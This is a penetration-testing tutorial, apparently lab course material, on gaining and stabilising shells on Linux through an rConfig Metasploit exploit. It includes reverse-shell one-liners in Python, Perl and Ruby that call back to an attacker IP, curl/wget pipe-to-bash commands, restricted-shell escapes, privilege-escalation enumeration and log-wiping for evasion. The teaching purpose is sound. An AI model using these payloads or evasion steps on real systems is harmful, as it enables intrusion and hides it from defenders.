# Infiltrating Unix/Linux

## Overview

According to W3Techs' ongoing OS usage statistics study, **over 70% of websites (webservers) run on Unix-based systems**. This presents significant opportunities for penetration testers to gain shell sessions on these environments and potentially pivot further within network infrastructures.

### Strategic Importance

**Why Unix/Linux Shells Matter:**
- **Web server dominance**: Most web applications run on Linux
- **Infrastructure backbone**: Critical systems often run on Unix/Linux
- **Pivot opportunities**: Web servers can provide access to internal networks
- **On-premises hosting**: Many organizations still host internally
- **Cloud environments**: Most cloud instances run Linux variants

**Attack Surface Considerations:**
- Web applications and services
- Network services (SSH, FTP, etc.)
- Database services (MySQL, PostgreSQL)
- Configuration management tools
- Container orchestration platforms

## Common Considerations

When planning to establish a shell session on a Unix/Linux system, consider these critical questions:

### 1. System Analysis Questions

**Distribution Identification:**
- What distribution of Linux is the system running?
- What version and kernel are in use?
- What package manager is available?

**Shell & Programming Environment:**
- What shells are available? (bash, sh, zsh, csh)
- What programming languages exist? (Python, Perl, Ruby, PHP)
- What interpreters are installed?
- Are there any restricted shells in place?

**Functional Purpose:**
- What function is the system serving for the network?
- Is it a web server, database server, or application server?
- What services are running?
- What is the system's role in the infrastructure?

**Application Stack:**
- What application is the system hosting?
- What web server software? (Apache, Nginx, Lighttpd)
- What application frameworks? (PHP, Python, Node.js)
- What databases are connected?

**Security Posture:**
- Are there any known vulnerabilities?
- What security controls are in place?
- Are there any misconfigurations?
- What is the patch level?

### 2. Reconnaissance Strategy

**Service Enumeration:**
```bash
# Port scanning
nmap -sC -sV target_ip

# Version detection
nmap -sV --version-intensity 9 target_ip

# Script scanning
nmap --script vuln target_ip
```

**Web Application Assessment:**
```bash
# Directory enumeration
gobuster dir -u http://target_ip -w /usr/share/wordlists/common.txt

# Technology detection
whatweb http://target_ip

# SSL/TLS analysis
sslyze target_ip:443
```

## Gaining a Shell Through Attacking a Vulnerable Application

### Step 1: Host Enumeration

**Comprehensive Nmap Scan:**
```bash
nmap -sC -sV 10.129.201.101
```

**Sample Output Analysis:**
```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
3306/tcp open  mysql    MySQL (unauthorized)
111/tcp  open  rpcbind  2-4 (RPC #100000)
```

**Information Gathered:**
- **Operating System**: CentOS Linux
- **Web Stack**: Apache 2.4.6, PHP 7.2.34, OpenSSL 1.0.2k
- **Services**: FTP, SSH, HTTP/HTTPS, MySQL, RPC
- **Function**: Web server hosting web application
- **SSL Configuration**: Self-signed certificate present

### Step 2: Web Application Discovery

**Initial Web Reconnaissance:**
- Navigate to HTTP/HTTPS endpoints
- Identify hosted applications
- Check for version information
- Look for default credentials

**Example: rConfig Discovery**
- **Application**: rConfig Configuration Management Tool
- **Purpose**: Network device configuration automation
- **Version**: 3.9.6 (visible on login page)
- **Critical Risk**: Admin access to network infrastructure

**rConfig Significance:**
- Automates network appliance configuration
- Remote interface configuration capabilities
- Potential access to routers, switches, firewalls
- High-value target for network compromise
- Could lead to complete network infrastructure control

### Step 3: Vulnerability Research

**Research Methodology:**
1. **Version-specific searches**: "rConfig 3.9.6 vulnerability"
2. **CVE databases**: Check NIST, MITRE, ExploitDB
3. **Security advisories**: Vendor bulletins, security researchers
4. **Proof of concepts**: GitHub, security blogs
5. **Metasploit modules**: Built-in exploit framework

**Search Results for rConfig 3.9.6:**
- **CVE-2019-16662**: Arbitrary file upload to RCE
- **CVE-2019-16663**: Authentication bypass
- **Multiple vulnerabilities**: Configuration disclosure, SQL injection

### Step 4: Metasploit Module Discovery

**Search for Exploits:**
```bash
msf6 > search rconfig
```

**Available Modules:**
```
#  Name                                             Disclosure Date  Rank       Description
0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Apache Solr RCE via Velocity Template
1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     Nuuo CMS Authenticated File Download
2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Rconfig 3.x Chained RCE
3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  rConfig install Command Execution
```

**Module Selection Criteria:**
- **Target specificity**: Matches exact version
- **Reliability rank**: Good to excellent ranking
- **Functionality**: Provides shell access
- **Prerequisites**: Authentication requirements

### Step 5: Advanced Exploit Research

**GitHub Repository Search:**
```bash
# Search pattern
"rConfig 3.9.6 exploit metasploit github"
```

**Manual Module Installation:**
```bash
# Locate MSF directories
locate exploits | grep metasploit

# Typical MSF path
/usr/share/metasploit-framework/modules/exploits

# Download and install custom module
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/linux/http/rconfig_vendors_auth_file_upload_rce.rb

# Copy to appropriate directory
cp rconfig_vendors_auth_file_upload_rce.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
```

**Metasploit Updates:**
```bash
# Update package manager
apt update && apt install metasploit-framework

# Reload MSF modules
msfconsole -x "reload_all"
```

## Exploiting rConfig - Practical Example

### Step 1: Module Selection and Configuration

**Load the Exploit:**
```bash
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

**View Module Options:**
```bash
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > show options
```

**Required Configuration:**
```bash
set RHOSTS 10.129.201.101
set RPORT 443
set SSL true
set LHOST 10.10.14.111
set LPORT 4444
```

### Step 2: Exploit Execution

**Launch the Attack:**
```bash
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
```

**Exploitation Process:**
```
[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860)
```

**Exploit Steps Breakdown:**
1. **Version Detection**: Confirms vulnerable rConfig 3.9.6
2. **Authentication**: Successfully logs into rConfig
3. **Payload Upload**: Uploads PHP-based reverse shell
4. **Payload Trigger**: Executes uploaded payload
5. **Stage Transfer**: Sends Meterpreter stage
6. **Cleanup**: Removes uploaded payload file
7. **Session Establishment**: Provides Meterpreter shell

### Step 3: Initial Shell Interaction

**Meterpreter Session:**
```bash
meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg
```

**Drop to System Shell:**
```bash
meterpreter > shell
Process 3958 created.
Channel 0 created.

# Test basic commands
dir
ajax-loader.gif  cisco.jpg  juniper.jpg

ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

## Shell Improvement Techniques

### Understanding Non-TTY Shells

**Characteristics of Non-TTY Shells:**
- **Limited functionality**: Missing interactive features
- **No prompt**: Commands execute without visual feedback
- **Restricted commands**: `su`, `sudo`, `nano` may not work
- **No tab completion**: Manual command entry required
- **No command history**: Previous commands not accessible
- **Signal handling issues**: Ctrl+C may terminate session

**Why Non-TTY Shells Occur:**
- **Service account execution**: Payload runs as web server user (apache)
- **Environment limitations**: No shell environment configured
- **Security restrictions**: Limited shell access by design

### Spawning TTY Shells

#### Method 1: Python PTY

**Check for Python:**
```bash
which python
which python3
```

**Spawn TTY with Python:**
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

**Enhanced Python TTY:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Result:**
```bash
sh-4.2$ whoami
apache
sh-4.2$ pwd
/home/rconfig/www/images/vendor
```

#### Method 2: Alternative TTY Methods

**Using Script Command:**
```bash
script -qc /bin/bash /dev/null
```

**Using Expect:**
```bash
expect -c "spawn $SHELL; interact"
```

**Using Socat (if available):**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.111:4445
```

#### Method 3: Full Interactive TTY

**Step 1: Initial PTY spawn**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Step 2: Background the session**
```bash
# Press Ctrl+Z to background
```

**Step 3: Configure local terminal**
```bash
stty raw -echo && fg
```

**Step 4: Reset terminal**
```bash
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <rows> columns <columns>
```

## Linux Shell Environments

### Common Linux Shells

| Shell | Binary | Description | Features |
|-------|--------|-------------|----------|
| **Bash** | `/bin/bash` | Bourne Again Shell | Command completion, history, scripting |
| **Sh** | `/bin/sh` | Bourne Shell | Basic POSIX compliance, minimal features |
| **Zsh** | `/bin/zsh` | Z Shell | Advanced features, customization |
| **Csh** | `/bin/csh` | C Shell | C-like syntax, job control |
| **Tcsh** | `/bin/tcsh` | TENEX C Shell | Enhanced C shell |
| **Fish** | `/bin/fish` | Friendly Interactive Shell | User-friendly, auto-suggestions |

### Shell Detection and Switching

**Current Shell Detection:**
```bash
echo $SHELL
echo $0
ps -p $$
```

**Available Shells:**
```bash
cat /etc/shells
which bash zsh csh tcsh
```

**Switch Shells:**
```bash
# Switch to bash
/bin/bash

# Switch to zsh
/bin/zsh

# Switch with login environment
su - username
```

### Programming Languages on Linux

#### Python Environment

**Version Detection:**
```bash
python --version
python3 --version
which python python3
```

**Module Availability:**
```bash
python -c "import sys; print(sys.path)"
python3 -c "import pty, subprocess, os; print('Available')"
```

**Common Python Exploits:**
```bash
# Command execution
python -c "import os; os.system('whoami')"

# Reverse shell
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.111',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
```

#### Perl Environment

**Availability Check:**
```bash
which perl
perl --version
```

**Perl Exploits:**
```bash
# Command execution
perl -e 'system("whoami")'

# Reverse shell
perl -e 'use Socket;$i="10.10.14.111";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby Environment

**Availability Check:**
```bash
which ruby
ruby --version
```

**Ruby Exploits:**
```bash
# Command execution
ruby -e 'system("whoami")'

# Reverse shell
ruby -rsocket -e'f=TCPSocket.open("10.10.14.111",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Linux Distribution Specifics

### Package Managers by Distribution

| Distribution | Package Manager | Commands |
|--------------|-----------------|----------|
| **Ubuntu/Debian** | apt | `apt update`, `apt install` |
| **CentOS/RHEL** | yum/dnf | `yum install`, `dnf install` |
| **Fedora** | dnf | `dnf install`, `dnf update` |
| **SUSE** | zypper | `zypper install`, `zypper update` |
| **Arch Linux** | pacman | `pacman -S`, `pacman -Syu` |
| **Alpine** | apk | `apk add`, `apk update` |

### Distribution Detection

**OS Release Information:**
```bash
cat /etc/os-release
cat /etc/*-release
lsb_release -a
```

**Kernel Information:**
```bash
uname -a
cat /proc/version
hostnamectl
```

**System Information:**
```bash
cat /etc/issue
cat /etc/motd
```

## Advanced Linux Exploitation Techniques

### Container Environment Detection

**Docker Detection:**
```bash
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
cat /proc/self/mountinfo | grep docker
```

**Container Escape Techniques:**
```bash
# Check for privileged containers
capsh --print

# Look for mounted host filesystem
mount | grep -E "(proc|sys|dev)"

# Check for socket access
ls -la /var/run/docker.sock
```

### Privilege Escalation Enumeration

**User Context:**
```bash
whoami
id
groups
sudo -l
```

**SUID/SGID Binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

**Writable Directories:**
```bash
find / -writable -type d 2>/dev/null
find /tmp -type f -perm -o+w 2>/dev/null
```

**Process Analysis:**
```bash
ps aux
ps -ef
pstree
```

**Network Connections:**
```bash
netstat -tulpn
ss -tulpn
lsof -i
```

### Persistence Mechanisms

**Cron Jobs:**
```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

**Service Files:**
```bash
systemctl list-unit-files
ls -la /etc/systemd/system/
ls -la /etc/init.d/
```

**Startup Scripts:**
```bash
ls -la /etc/rc*.d/
cat /etc/rc.local
```

## Common Linux Vulnerabilities

### Kernel Exploits

**Kernel Version Check:**
```bash
uname -r
cat /proc/version
```

**Common Kernel Exploits:**
- **DirtyCow**: CVE-2016-5195
- **Overlayfs**: CVE-2021-3493
- **PwnKit**: CVE-2021-4034
- **Baron Samedit**: CVE-2021-3156

### Application-Specific Vulnerabilities

**Web Applications:**
- PHP vulnerabilities and misconfigurations
- CGI script vulnerabilities
- File upload vulnerabilities
- SQL injection leading to file write

**Network Services:**
- SSH misconfigurations
- FTP anonymous access
- NFS exports with no_root_squash
- SMB/CIFS shares

## Detection Evasion on Linux

### Log Management

**Common Log Locations:**
```bash
/var/log/auth.log       # Authentication logs
/var/log/syslog         # System logs
/var/log/apache2/       # Apache logs
/var/log/nginx/         # Nginx logs
/var/log/secure         # CentOS/RHEL auth logs
```

**Log Cleanup:**
```bash
# Clear specific logs
> /var/log/auth.log
> /var/log/syslog

# Clear command history
history -c
> ~/.bash_history
unset HISTFILE
```

### Process Hiding

**Background Processes:**
```bash
nohup command &
screen -dmS session_name command
tmux new-session -d -s session_name command
```

**Memory-only Execution:**
```bash
# Execute from memory
curl -s http://10.10.14.111/script.sh | bash
wget -qO- http://10.10.14.111/script.py | python3
```

## Best Practices for Linux Exploitation

### Reconnaissance

1. **Thorough enumeration** of services and versions
2. **Web application assessment** for vulnerabilities
3. **Configuration analysis** for misconfigurations
4. **User enumeration** for potential targets

### Exploitation

1. **Research target-specific vulnerabilities** thoroughly
2. **Test exploits** in controlled environments first
3. **Understand exploit mechanisms** before deployment
4. **Plan payload delivery** based on target constraints

### Post-Exploitation

1. **Stabilize shell access** immediately
2. **Gather system intelligence** for privilege escalation
3. **Establish persistence** if authorized
4. **Document findings** for reporting

### Operational Security

1. **Minimize log generation** during testing
2. **Clean up artifacts** after assessment
3. **Use encrypted communications** when possible
4. **Understand detection mechanisms** in environment

## Advanced Shell Spawning Techniques

When Python is not available on the target system, several alternative methods can be used to spawn interactive shells. Understanding these techniques is crucial for situations where primary methods fail.

### Shell Interpreter Direct Execution

#### /bin/sh Interactive Mode

**Basic Interactive Shell:**
```bash
/bin/sh -i
```

**Expected Output:**
```bash
sh: no job control in this shell
sh-4.2$
```

**Features:**
- **Interactive mode (-i)**: Enables interactive functionality
- **Basic shell**: Minimal features but reliable
- **Wide compatibility**: Available on most Unix/Linux systems
- **Job control limitation**: No background process management

#### Alternative Shell Binaries

**Bash Interactive:**
```bash
/bin/bash -i
```

**Dash Interactive:**
```bash
/bin/dash -i
```

**Zsh Interactive:**
```bash
/bin/zsh -i
```

### Programming Language Spawning

#### Perl Shell Spawning

**Direct Execution:**
```perl
perl -e 'exec "/bin/sh";'
```

**Script-based Execution:**
```perl
# From within a Perl script
exec "/bin/sh";
```

**Alternative Perl Methods:**
```perl
# Using system call
perl -e 'system("/bin/sh");'

# Using backticks
perl -e '`/bin/sh`;'
```

#### Ruby Shell Spawning

**Direct Execution:**
```ruby
ruby -e 'exec "/bin/sh"'
```

**Script-based Execution:**
```ruby
# From within a Ruby script
exec "/bin/sh"
```

**Alternative Ruby Methods:**
```ruby
# Using system call
ruby -e 'system("/bin/sh")'

# Using Process.spawn
ruby -e 'Process.spawn("/bin/sh")'
```

#### Lua Shell Spawning

**OS Execute Method:**
```lua
lua -e "os.execute('/bin/sh')"
```

**Script-based Execution:**
```lua
-- From within a Lua script
os.execute('/bin/sh')
```

**Alternative Lua Methods:**
```lua
-- Using io.popen
lua -e "io.popen('/bin/sh'):read('*all')"
```

### System Utility Spawning

#### AWK Shell Spawning

**BEGIN Block Method:**
```bash
awk 'BEGIN {system("/bin/sh")}'
```

**Pattern-based Method:**
```bash
awk '{system("/bin/sh")}' /etc/passwd
```

**One-liner with File:**
```bash
echo | awk '{system("/bin/sh")}'
```

**Features:**
- **C-like language**: Pattern scanning and processing
- **Widely available**: Present on most Unix/Linux systems
- **System function**: Direct system command execution
- **Report generation**: Original purpose for text processing

#### Find Command Spawning

**Method 1: Find with AWK**
```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

**Method 2: Direct Execution**
```bash
find . -exec /bin/sh \; -quit
```

**Method 3: Interactive Find**
```bash
find /etc -name passwd -exec /bin/sh \;
```

**Find Command Breakdown:**
- **Search function**: Looks for specified file
- **Execute option (-exec)**: Runs command when file found
- **Quit option (-quit)**: Stops after first match
- **Flexible execution**: Can execute any binary

#### VIM Editor Spawning

**Method 1: Command Line Option**
```bash
vim -c ':!/bin/sh'
```

**Method 2: Interactive VIM**
```bash
vim
:set shell=/bin/sh
:shell
```

**Method 3: VIM Bang Command**
```bash
vim
:!/bin/sh
```

**VIM Features:**
- **Command mode**: Execute shell commands
- **Shell setting**: Configure default shell
- **Bang commands**: Direct command execution
- **Editor escape**: Break out of text editing context

### Advanced Alternative Methods

#### Using Less/More Pagers

**Less Command:**
```bash
less /etc/passwd
# Then type: !/bin/sh
```

**More Command:**
```bash
more /etc/passwd
# Then type: !/bin/sh
```

#### Using Man Pages

**Man Command:**
```bash
man ls
# Then type: !/bin/sh
```

#### Using ED Editor

**ED Line Editor:**
```bash
ed
!/bin/sh
```

#### Using Expect

**Expect Spawn:**
```bash
expect -c "spawn /bin/sh; interact"
```

### Binary and Language Detection

#### Check Available Interpreters

**Programming Languages:**
```bash
which python python3 perl ruby lua
which awk gawk mawk
which vim nano emacs
which less more man
```

**Shell Interpreters:**
```bash
cat /etc/shells
which bash sh zsh csh tcsh fish
```

**System Utilities:**
```bash
which find locate ed sed
which expect script socat
```

#### Capability Assessment

**Test Command Execution:**
```bash
# Test basic commands
ls /bin/sh
ls /bin/bash
ls /usr/bin/python*

# Test permissions
ls -la /bin/sh
ls -la /usr/bin/vim
```

## Permission and Privilege Considerations

### File Permission Analysis

**Check Binary Permissions:**
```bash
ls -la <path/to/fileorbinary>
```

**Example Output:**
```bash
-rwxr-xr-x 1 root root 154072 Apr  18  2019 /bin/sh
-rwxr-xr-x 1 root root    35048 Apr  18  2019 /usr/bin/awk
-rwxr-xr-x 1 root root   3027776 Apr  18  2019 /usr/bin/vim
```

**Permission Breakdown:**
- **rwx**: Owner (read, write, execute)
- **r-x**: Group (read, execute)
- **r-x**: Others (read, execute)

### Sudo Permission Enumeration

**Check Sudo Capabilities:**
```bash
sudo -l
```

**Sample Output:**
```bash
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

**Sudo Analysis:**
- **NOPASSWD: ALL**: Can run any command without password
- **env_reset**: Environment variables reset on sudo
- **secure_path**: Restricted PATH for sudo commands

**Requirements for Sudo Check:**
- **Stable interactive shell**: TTY required for input
- **Working terminal**: Proper shell environment
- **User context**: Current user permissions

### Privilege Escalation Indicators

**High-Privilege Indicators:**
```bash
# Check for wheel group membership
groups
id

# Check for admin/sudo groups
cat /etc/group | grep -E "(sudo|admin|wheel)"

# Check for interesting SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep -E "(vim|find|awk|perl|python)"
```

## Shell Stability and Improvement

### Stabilization Sequence

**Step 1: Initial Shell Spawn**
```bash
# Use any available method from above
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR
/bin/sh -i
# OR
awk 'BEGIN {system("/bin/sh")}'
```

**Step 2: Environment Configuration**
```bash
export TERM=xterm-256color
export SHELL=/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Step 3: History and Aliases**
```bash
# Enable command history
set -o history
# Set useful aliases
alias ll='ls -la'
alias la='ls -A'
```

### Shell Feature Testing

**Test Interactive Features:**
```bash
# Tab completion
ls /etc/<TAB><TAB>

# Command history
history

# Job control
sleep 60 &
jobs
fg

# Signal handling
# Try Ctrl+C, Ctrl+Z
```

## Troubleshooting Shell Issues

### Common Problems and Solutions

**Problem 1: No Prompt Display**
```bash
# Solution: Set PS1 variable
export PS1='$ '
# Or more detailed
export PS1='\u@\h:\w\$ '
```

**Problem 2: Commands Not Found**
```bash
# Solution: Check and set PATH
echo $PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Problem 3: Terminal Size Issues**
```bash
# Solution: Set terminal dimensions
stty rows 24 columns 80
# Or get current terminal size
stty size
```

**Problem 4: No Tab Completion**
```bash
# Solution: Enable programmable completion
set -o tabcompletion
# Or load bash completion
source /etc/bash_completion
```

### Shell Escape Techniques

**From Restricted Shells:**
```bash
# Break out of rbash
export PATH=/bin:/usr/bin:$PATH
cd /tmp && exec bash

# Vim escape
vim
:set shell=/bin/bash
:shell

# Less/more escape
less /etc/passwd
!/bin/bash

# Python escape
python -c "import os; os.system('/bin/bash')"
```

## Best Practices for Shell Spawning

### Selection Strategy

1. **Assess available resources** on target system
2. **Start with most reliable methods** (Python, /bin/sh)
3. **Fall back to system utilities** if needed
4. **Consider permission requirements** for each method
5. **Test shell stability** after spawning

### Operational Considerations

1. **Minimize noise** during shell spawning
2. **Avoid triggering security alerts** with unusual commands
3. **Document successful methods** for future reference
4. **Plan for shell loss** and recovery methods
5. **Understand environment limitations** before proceeding

### Security Awareness

1. **Monitor process creation** that might be logged
2. **Understand command auditing** on target system
3. **Consider shell history** and logging implications
4. **Plan cleanup procedures** for spawned processes
5. **Use appropriate shells** for stealth requirements

## Conclusion

Linux/Unix systems dominate the server landscape, making shell access skills essential for penetration testers. Success requires:

- **Comprehensive enumeration** to identify attack vectors
- **Application-specific research** for targeted exploits
- **Shell improvement techniques** for effective post-exploitation
- **Multiple spawning methods** when primary techniques fail
- **Distribution awareness** for platform-specific techniques
- **Programming language utilization** for payload delivery
- **Detection evasion** strategies for stealthy operations

The key to successful Linux exploitation lies in understanding the target environment, leveraging appropriate tools and techniques, and maintaining situational awareness throughout the engagement. Having multiple shell spawning techniques in your arsenal ensures success even when primary methods are unavailable. Regular practice with different distributions and scenarios will improve proficiency and success rates. 